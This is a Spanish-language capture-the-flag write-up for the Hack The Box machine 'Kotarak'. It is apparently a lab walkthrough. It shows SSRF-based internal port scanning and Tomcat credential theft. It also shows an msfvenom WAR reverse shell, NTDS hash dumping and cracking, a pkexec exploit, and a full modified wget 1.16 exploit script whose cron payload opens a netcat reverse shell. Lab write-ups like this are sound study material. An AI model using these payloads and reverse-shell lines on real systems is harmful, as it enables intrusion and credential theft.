---
layout: post
title: Kotarak
date: 2023-03-21
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, eCPPTv2, OSWE, eCPTXv2]
---
___

<center><img src="/writeups/assets/img/Kotarak-htb/Kotarak.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* SSRF

* Internal Port Discovery

* Information Disclosure

* Abuso Tomcat

* Dumpeo de hashes NT

* Explotación de wget 1.12 (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.55 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 17:51 GMT
Nmap scan report for 10.10.10.55
Host is up (0.10s latency).
Not shown: 65103 closed tcp ports (reset), 428 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,8009,8080,60000 10.10.10.55 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-21 17:52 GMT
Nmap scan report for 10.10.10.55
Host is up (0.065s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2d7ca0eb7cb0a51f72e75ea02241774 (RSA)
|   256 e8f1c0d37d9b4373ad373bcbe1648ee9 (ECDSA)
|_  256 6de926ad86022d68e1ebad66a06017b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.18 seconds
```

## Puerto 8080 (HTTP)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.55:8080/
http://10.10.10.55:8080/ [404 Not Found] Apache-Tomcat[8.5.5], Content-Language[en], Country[RESERVED][ZZ], HTML5, IP[10.10.10.55], Title[Apache Tomcat/8.5.5 - Error report]
```

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.55:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.55:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/21 17:57:12 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

Como es un ```Tomcat```, existe la ruta ```/manager/html```. Pero requiere de autenticación

<img src="/writeups/assets/img/Kotarak-htb/1.png" alt="">

De momento lo dejo de lado

## Puerto 60000 (HTTP)

Con ```whatweb``` analizo las tecnologías que utiliza el servicio web

```null
whatweb http://10.10.10.55:60000
http://10.10.10.55:60000 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.55], Title[Kotarak Web Hosting][Title element contains newline(s)!]
```

La página principal se ve así:

<img src="/writeups/assets/img/Kotarak-htb/2.png" alt="">

Al introducir cualquier campo en el formulario me redirige a ```http://10.10.10.55:60000/url.php?path=test```, donde 'test' es el input. Es vulnerable a SSRF

```null
curl -s -X GET 'http://10.10.10.55:60000/url.php?path=http://localhost:22'
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.
```

Utilizo ```wfuzz``` para descubrir puertos abiertos

```null
wfuzz -c --hh=2 -t 200 -z range,1-65535 'http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000022:   200        4 L      4 W        62 Ch       "22"                                                                                                                                           
000000320:   200        26 L     109 W      1232 Ch     "320"                                                                                                                                          
000000200:   200        3 L      2 W        22 Ch       "200"                                                                                                                                          
000000090:   200        11 L     18 W       156 Ch      "90"                                                                                                                                           
000000888:   200        78 L     265 W      3955 Ch     "888"                                                                                                                                          
000000110:   200        17 L     24 W       187 Ch      "110"                                                                                                                                          
000003306:   200        2 L      6 W        123 Ch      "3306"                                                                                                                                         
000008080:   200        2 L      47 W       994 Ch      "8080"                                                                                                                                         
000060000:   200        78 L     130 W      1171 Ch     "60000"                                                                                                                                        

Total time: 0
Processed Requests: 65532
Filtered Requests: 65523
Requests/sec.: 0
```

El puerto 320 se ve asi

<img src="/writeups/assets/img/Kotarak-htb/3.png" alt="">

Y el 888

<img src="/writeups/assets/img/Kotarak-htb/4.png" alt="">

Puedo obtener el contenido de un backup

```null
curl -s -X GET 'http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup'
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
    <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>

</tomcat-users>
```

Aparaceren las credenciales del ```Tomcat```, ```admin:3@g01PdhB!```. Son válidas

<img src="/writeups/assets/img/Kotarak-htb/5.png" alt="">

Creo un war que se encargue de enviarme una reverse shell

```null
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f war -o pwned.war
Payload size: 1085 bytes
Final size of war file: 1085 bytes
Saved as: pwned.war
```

La subo, ejecuto y gano acceso al sistema. Estoy dentro de un contenedor

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.55] 60860
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@kotarak-dmz:/$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
tomcat@kotarak-dmz:/$ export TERM=xterm
tomcat@kotarak-dmz:/$ export SHELL=bash
tomcat@kotarak-dmz:/$ stty rows 55 columns 209
```

Estoy en la máquina víctima, pero tengo asiganada otra interfaz

```null
tomcat@kotarak-dmz:~$ hostname -I
10.10.10.55 10.0.3.1 dead:beef::250:56ff:feb9:1483
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery

```null
tomcat@kotarak-dmz:/tmp$ ./nmap --min-rate 5000 -n -sn 10.0.3.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-22 06:10 EDT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.0.3.1
Host is up (0.00024s latency).
Nmap scan report for 10.0.3.133
Host is up (0.000079s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 0.30 seconds
tomcat@kotarak-dmz:/tmp$ 
```

Escaneo los puertos para la ```10.0.3.133```. Tiene el SSH abierto

```null
tomcat@kotarak-dmz:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 10.0.3.133

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-22 06:11 EDT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.0.3.133
Host is up (0.000091s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
tomcat@kotarak-dmz:/tmp$ 
```

En el directorio personal de este usuario, hay un directorio con archivos de una "auditoría"

Los traigo a mi equipo, y puedo dumpear los hashes NT

```null
impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up... 
```

Los crackeo con ```hashcat```

```null
hashcat hashes /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1000 | NTLM | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Failed to parse hashes using the 'pwdump' format.
e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
```

Es válida para ```atanas```

```null
tomcat@kotarak-dmz:/home$ su atanas
Password: 
atanas@kotarak-dmz:/home$ 
```

Puedo ver la primera flag

```null
atanas@kotarak-dmz:~$ cat user.txt 
93f844f50491ef797c9c1b601b4bece8
```

# Escalada (No intencionada)

Se puede abusar del ```pkexec```

```null
tomcat@kotarak-dmz:/tmp$ ./pwned.sh 
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
root@kotarak-dmz:/tmp#    
```

# Escalada

Todos tienen capacidad de lectura y escritura en el directorio ```/root```

```null
atanas@kotarak-dmz:/$ ls -l | grep root$
drwxrwxrwx   6 root root  4096 Sep 19  2017 root
```

Puedo ver un log

```null
atanas@kotarak-dmz:/root$ cat app.log 
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

Se está tratando de descargar un comprido desde un contenedor. En la configuración del ```authbind``` se está asignada una regla que me permite abrir el puerto 80. En caso contrario, no podría

```null
atanas@kotarak-dmz:/etc/authbind/byport$ python3 -m http.server 80
Traceback (most recent call last):
  File "/usr/lib/python3.5/runpy.py", line 184, in _run_module_as_main
    "__main__", mod_spec)
  File "/usr/lib/python3.5/runpy.py", line 85, in _run_code
    exec(code, run_globals)
  File "/usr/lib/python3.5/http/server.py", line 1221, in <module>
    test(HandlerClass=handler_class, port=args.port, bind=args.bind)
  File "/usr/lib/python3.5/http/server.py", line 1194, in test
    httpd = ServerClass(server_address, HandlerClass)
  File "/usr/lib/python3.5/socketserver.py", line 440, in __init__
    self.server_bind()
  File "/usr/lib/python3.5/http/server.py", line 138, in server_bind
    socketserver.TCPServer.server_bind(self)
  File "/usr/lib/python3.5/socketserver.py", line 454, in server_bind
    self.socket.bind(self.server_address)
PermissionError: [Errno 13] Permission denied
```

```null
atanas@kotarak-dmz:/etc/authbind/byport$ authbind python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Efectivamente, hay una tarea CRON por detrás

```null
atanas@kotarak-dmz:/tmp$ authbind nc -nlvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 41066)
GET /archive.tar.gz HTTP/1.1
User-Agent: Wget/1.16 (linux-gnu)
Accept: */*
Host: 10.0.3.1
Connection: Keep-Alive
```

Esta versión de ```wget``` es vulnerable a una ejecución remota de comandos

```null
searchsploit wget 1.16
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Wget < 1.18 - Access List Bypass / Race Condition                                                                                                                          | multiple/remote/40824.py
GNU Wget < 1.18 - Arbitrary File Upload (2)                                                                                                                                    | linux/remote/49815.py
GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution                                                                                                                | linux/remote/40064.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Para explotarlo hay que hacer lo siguiente:

```null
atanas@kotarak-dmz:/tmp$ mkdir /tmp/ftptest
atanas@kotarak-dmz:/tmp$ cd /tmp/ftptest
atanas@kotarak-dmz:/tmp/ftptest$ cat <<_EOF_>.wgetrc
> post_file = /etc/shadow
> output_document = /etc/cron.d/wget-root-shell
> _EOF_
atanas@kotarak-dmz:/tmp/ftptest$ authbind python -m pyftpdlib -p21 -w &>/dev/null &

Retoco el ```exploit.py```

```null
import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc
       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	 print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	 print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '10.0.3.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.0.3.1'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f \n"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
```

Ejecuto y gano acceso al sistema

```null
atanas@kotarak-dmz:/tmp/ftptest$ authbind python exploit.py
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.55] 45180
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
950d1425795dfd38272c93ccbb63ae2c
```